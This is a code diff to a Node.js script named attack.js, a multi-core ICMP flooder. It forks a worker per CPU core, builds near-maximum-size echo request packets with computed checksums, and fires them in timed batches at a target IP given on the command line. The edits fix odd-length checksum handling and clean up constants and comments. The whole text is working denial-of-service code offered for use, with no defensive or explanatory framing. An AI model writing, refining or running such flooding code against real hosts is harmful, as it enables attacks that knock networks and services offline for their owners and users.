@@ -5,9 +5,9 @@ const { exec } = require('child_process');
 
 const target = process.argv[2];
 const duration = parseInt(process.argv[3]);
-const batchSize = 10; // packets per batch
-const reloadMin = 2300; // ms
-const reloadMax = 2500; // ms
+const batchSize = 10;
+const reloadMin = 2300;
+const reloadMax = 2500;
 
 if (!target || isNaN(duration)) {
   console.log('Usage: node attack.js <target_ip> <duration_seconds>');
@@ -28,7 +28,7 @@ if (cluster.isMaster) {
   console.log(`Duration: ${duration}s`);
   console.log(`Using ${cores} cores`);
   console.log(`Batch size: ${batchSize} packets`);
-  console.log(`Reload time between batches: ~2.3-2.5s`);
+  console.log(`Reload time: ~2.3-2.5s`);
   console.log('Launching...\n');
 
   for (let i = 0; i < cores; i++) cluster.fork();
@@ -82,26 +82,24 @@ if (cluster.isMaster) {
   let pps = 0;
   let bytesSent = 0;
 
-  // Max payload size: 65507 bytes (max safe ICMP payload)
-  const payloadSize = 65507;
+  const payloadSize = 65499;
 
-  // Prepare reusable packet buffer for given seq
   function createPacket(seqNum) {
     const buf = Buffer.alloc(8 + payloadSize);
     buf.writeUInt8(8, 0); // Type: Echo Request
     buf.writeUInt8(0, 1); // Code
-    buf.writeUInt16BE(0, 2); // checksum placeholder
+    buf.writeUInt16BE(0, 2); // Checksum placeholder
     buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
-    buf.writeUInt16BE(seqNum & 0xffff, 6); // Seq
+    buf.writeUInt16BE(seqNum & 0xffff, 6); // Sequence
 
-    // Fill payload with constant pattern (0x42 = '*')
-    buf.fill(0x42, 8);
+    buf.fill(0x42, 8); // Payload
 
-    // Calculate checksum correctly
     let sum = 0;
-    for (let i = 0; i < buf.length; i += 2) {
-      let word = buf.readUInt16BE(i);
-      sum += word;
+    for (let i = 0; i < buf.length - 1; i += 2) {
+      sum += buf.readUInt16BE(i);
+    }
+    if (buf.length % 2 === 1) {
+      sum += buf[buf.length - 1] << 8;
     }
     while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
     const checksum = (~sum) & 0xffff;
@@ -110,7 +108,6 @@ if (cluster.isMaster) {
     return buf;
   }
 
-  // Async batch send with reload delay
   async function batchSend(count) {
     if (Date.now() >= endTime) return;
 
@@ -125,8 +122,7 @@ if (cluster.isMaster) {
       });
     }
 
-    // Reload delay (random 2300-2500 ms)
-    const reloadDelay = 2300 + Math.random() * 200;
+    const reloadDelay = reloadMin + Math.random() * (reloadMax - reloadMin);
     await new Promise(r => setTimeout(r, reloadDelay));
 
     if (Date.now() < endTime) batchSend(count);
